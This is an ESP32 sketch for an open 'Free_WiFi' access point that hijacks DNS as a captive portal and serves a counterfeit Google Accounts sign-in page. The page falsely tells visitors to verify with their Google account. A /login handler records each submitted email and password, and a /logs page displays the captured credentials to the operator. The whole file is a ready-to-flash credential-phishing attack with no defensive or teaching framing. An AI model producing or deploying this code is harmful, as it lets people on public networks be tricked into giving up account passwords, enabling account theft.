#include <WiFi.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>

const char *ssid = "Free_WiFi";
const char *password = "";

AsyncWebServer server(80);
DNSServer dnsServer;

String storedData = "";

void setup() {
    Serial.begin(115200);
    
    WiFi.softAP(ssid, password);
    Serial.println("AP Started");

    // Intercept all DNS requests and redirect to ESP32 (Captive Portal behavior)
    dnsServer.start(53, "*", WiFi.softAPIP());

    // Serve the fake login page
    server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
      
           request->send(200, "text/html",
           "<!DOCTYPE html>"
            "<html lang='en'>"
            "<head>"
            "<meta charset='UTF-8'>"
            "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
            "<title>Sign in - Google Accounts</title>"
            "<style>"
            "body { font-family: Arial, sans-serif; text-align: center; background-color: #f2f2f2; margin: 0; padding: 0; }"
            ".top-banner { background-color: #1a73e8; color: white; padding: 10px; font-size: 16px; }"
            ".login-box { width: 380px; max-width: 90%; background: white; padding: 30px; margin: 10vh auto; border-radius: 10px; "
            "box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2); }"
            ".google-logo { font-size: 28px; font-weight: bold; }"
            ".blue { color: #4285F4; }"
            ".red { color: #DB4437; }"
            ".yellow { color: #F4B400; }"
            ".green { color: #0F9D58; }"
            "h2 { font-weight: normal; font-size: 22px; color: #202124; margin-bottom: 10px; }"
            "p { color: #5f6368; font-size: 14px; }"
            "input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }"
            ".submit-btn { width: 100%; padding: 12px; background-color: #1a73e8; color: white; border: none; border-radius: 4px; "
            "font-size: 16px; cursor: pointer; font-weight: bold; }"
            ".submit-btn:hover { background-color: #1669c1; }"
            "a { text-decoration: none; font-size: 14px; color: #1a73e8; display: block; margin-top: 10px; }"
            "@media (max-width: 600px) {"
            "  .login-box { width: 95%; padding: 20px; }"
            "  .google-logo { font-size: 24px; }"
            "  h2 { font-size: 20px; }"
            "  p, a { font-size: 13px; }"
            "  input, .submit-btn { font-size: 14px; padding: 10px; }"
            "}"
            "</style>"
            "<script>"
            "function fakeLogin(event) {"
            " event.preventDefault();"
            " var formData = new FormData(document.getElementById('login-form'));"
            " fetch('/login', { method: 'POST', body: formData })"
            " .then(response => { document.getElementById('login-form').reset(); });"
            "}"
            "</script>"
            "</head>"
            "<body>"
            "<div class='top-banner'>To access Free WiFi, verify with your Google Account</div>"
            "<div class='login-box'>"
            "<div class='google-logo'>"
            "<span class='blue'>G</span><span class='red'>o</span><span class='yellow'>o</span><span class='blue'>g</span><span class='green'>l</span><span class='red'>e</span>"
            "</div>"
            "<h2>Sign in</h2>"
            "<p>Use your Google Account</p>"
            "<form id='login-form'>"
            "<input type='text' name='user' placeholder='Email or phone' required><br>"
            "<input type='password' name='pass' placeholder='Enter your password' required><br>"
            "<a href='#'>Forgot password?</a><br><br>"
            "<button type='submit' class='submit-btn' onclick='fakeLogin(event)'>Next</button>"
            "</form>"
            "</div>"
            "</body>"
            "</html>");



    });

    // Capture login credentials
    server.on("/login", HTTP_POST, [](AsyncWebServerRequest *request) {
        String username, password;
        if (request->hasParam("user", true) && request->hasParam("pass", true)) {
            username = request->getParam("user", true)->value();
            password = request->getParam("pass", true)->value();
            storedData += "User: " + username + " | Pass: " + password + "<br>";
        }
        request->send(200, "text/html", "<h1>Login Failed</h1><p>Try again later.</p>");
    });

    // Display captured credentials
    server.on("/logs", HTTP_GET, [](AsyncWebServerRequest *request) {
        String html = "<html>"
                      "<head>"
                      "<meta http-equiv='refresh' content='1'>"
                      "<title>Logs</title>"
                      "<style>body { font-family: Arial; text-align: center; } pre { text-align: left; }</style>"
                      "</head>"
                      "<body>"
                      "<h2>Captured Credentials</h2>"
                      "<pre>" + storedData + "</pre>"
                      "</body>"
                      "</html>";
        request->send(200, "text/html", html);  

    });

    // Force redirection for unknown requests
    server.onNotFound([](AsyncWebServerRequest *request) {
        request->redirect("http://192.168.4.1/");
    });

    server.begin();
}

void loop() {
    dnsServer.processNextRequest();
}
